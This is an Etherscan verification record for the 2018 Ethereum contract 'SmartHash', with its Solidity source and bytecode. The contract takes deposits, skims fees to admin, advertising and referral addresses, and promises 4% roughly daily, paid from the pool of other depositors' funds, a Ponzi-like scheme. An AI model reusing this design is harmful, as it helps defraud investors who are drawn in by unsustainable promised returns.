{
  "address": "0xb10ea0d397db942a1083a4af9c6074ab63bc8c8b",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "SmartHash",
  "contractName": "SmartHash",
  "compilerVersion": "v0.4.25+commit.59dbf8f1",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2018-10-04\n*/\n\npragma solidity ^0.4.25;\n\nlibrary SafeMath {\n  function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n    if (_a == 0) {\n      return 0;\n    }\n    c = _a * _b;\n    assert(c / _a == _b);\n    return c;\n  }\n\n  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n    return _a / _b;\n  }\n\n  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n    assert(_b <= _a);\n    return _a - _b;\n  }\n\n  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n    c = _a + _b;\n    assert(c >= _a);\n    return c;\n  }\n}\n\ncontract SmartHash {\n\tusing SafeMath for uint256;\n\n\taddress public constant admAddress = 0xb5a885c796DbD4656345551cc41d3E8844ac8c04;\n\taddress public constant advAddress = 0xd0396aAEcb5547776852aB8682Ba72E1209b536d;\n\n\tmapping (address => uint256) deposited;\n\tmapping (address => uint256) withdrew;\n\tmapping (address => uint256) refearned;\n\tmapping (address => uint256) blocklock;\n\n\tuint256 public totalDepositedWei = 0;\n\tuint256 public totalWithdrewWei = 0;\n\n\tfunction() payable external {\n\t\tuint256 admRefPerc = msg.value.mul(5).div(100);\n\t\tuint256 advPerc = msg.value.mul(10).div(100);\n\n\t\tadvAddress.transfer(advPerc);\n\t\tadmAddress.transfer(admRefPerc);\n\n\t\tif (deposited[msg.sender] != 0) {\n\t\t\taddress investor = msg.sender;\n\t\t\tuint256 depositsPercents = deposited[msg.sender].mul(4).div(100).mul(block.number-blocklock[msg.sender]).div(5900);\n\t\t\tinvestor.transfer(depositsPercents);\n\n\t\t\twithdrew[msg.sender] += depositsPercents;\n\t\t\ttotalWithdrewWei = totalWithdrewWei.add(depositsPercents);\n\t\t}\n\n\t\taddress referrer = bytesToAddress(msg.data);\n\t\tif (referrer > 0x0 && referrer != msg.sender) {\n\t\t\treferrer.transfer(admRefPerc);\n\n\t\t\trefearned[referrer] += admRefPerc;\n\t\t}\n\n\t\tblocklock[msg.sender] = block.number;\n\t\tdeposited[msg.sender] += msg.value;\n\n\t\ttotalDepositedWei = totalDepositedWei.add(msg.value);\n\t}\n\n\tfunction userDepositedWei(address _address) public view returns (uint256) {\n\t\treturn deposited[_address];\n    }\n\n\tfunction userWithdrewWei(address _address) public view returns (uint256) {\n\t\treturn withdrew[_address];\n    }\n\n\tfunction userDividendsWei(address _address) public view returns (uint256) {\n\t\treturn deposited[_address].mul(4).div(100).mul(block.number-blocklock[_address]).div(5900);\n    }\n\n\tfunction userReferralsWei(address _address) public view returns (uint256) {\n\t\treturn refearned[_address];\n    }\n\n\tfunction bytesToAddress(bytes bys) private pure returns (address addr) {\n\t\tassembly {\n\t\t\taddr := mload(add(bys, 20))\n\t\t}\n\t}\n}",
  "bytecode": "60806040526000600455600060055534801561001a57600080fd5b506105798061002a6000396000f30060806040526004361061008d5763ffffffff7c0100000000000000000000000000000000000000000000000000000000600035041663031dcaf5811461031a5780631b68adff1461034b5780635b9de1d31461037e578063b781e47d14610393578063c8d1c6cf146103a8578063ee12d4f2146103c9578063ee1596e5146103de578063fc4fcc5a146103ff575b6000808080806100b560646100a934600563ffffffff61042016565b9063ffffffff61044f16565b94506100cd60646100a934600a63ffffffff61042016565b60405190945073d0396aaecb5547776852ab8682ba72e1209b536d9085156108fc029086906000818181858888f19350505050158015610111573d6000803e3d6000fd5b5060405173b5a885c796dbd4656345551cc41d3e8844ac8c049086156108fc029087906000818181858888f19350505050158015610153573d6000803e3d6000fd5b503360009081526020819052604090205415610221573360008181526003602090815260408083205491839052909120549194506101bb9161170c916100a9914391909103906101af906064908490600463ffffffff61042016565b9063ffffffff61042016565b604051909250600160a060020a0384169083156108fc029084906000818181858888f193505050501580156101f4573d6000803e3d6000fd5b5033600090815260016020526040902080548301905560055461021d908363ffffffff61046416565b6005555b61025b6000368080601f01602080910402602001604051908101604052809392919081815260200183838082843750610471945050505050565b9050600081600160a060020a031611801561027f5750600160a060020a0381163314155b156102da57604051600160a060020a0382169086156108fc029087906000818181858888f193505050501580156102ba573d6000803e3d6000fd5b50600160a060020a03811660009081526002602052604090208054860190555b3360009081526003602090815260408083204390559082905290208054349081019091556004546103109163ffffffff61046416565b6004555050505050005b34801561032657600080fd5b5061032f610478565b60408051600160a060020a039092168252519081900360200190f35b34801561035757600080fd5b5061036c600160a060020a0360043516610490565b60408051918252519081900360200190f35b34801561038a57600080fd5b5061032f6104d8565b34801561039f57600080fd5b5061036c6104f0565b3480156103b457600080fd5b5061036c600160a060020a03600435166104f6565b3480156103d557600080fd5b5061036c610511565b3480156103ea57600080fd5b5061036c600160a060020a0360043516610517565b34801561040b57600080fd5b5061036c600160a060020a0360043516610532565b600082151561043157506000610449565b5081810281838281151561044157fe5b041461044957fe5b92915050565b6000818381151561045c57fe5b049392505050565b8181018281101561044957fe5b6014015190565b73b5a885c796dbd4656345551cc41d3e8844ac8c0481565b600160a060020a038116600090815260036020908152604080832054918390528220546104499161170c916100a9914303906101af906064908490600463ffffffff61042016565b73d0396aaecb5547776852ab8682ba72e1209b536d81565b60055481565b600160a060020a031660009081526020819052604090205490565b60045481565b600160a060020a031660009081526002602052604090205490565b600160a060020a0316600090815260016020526040902054905600a165627a7a72305820e1c4bb3a5c587d071bd1841147d986e1c4c0229567786ca8734f1045098ca8bc0029"
}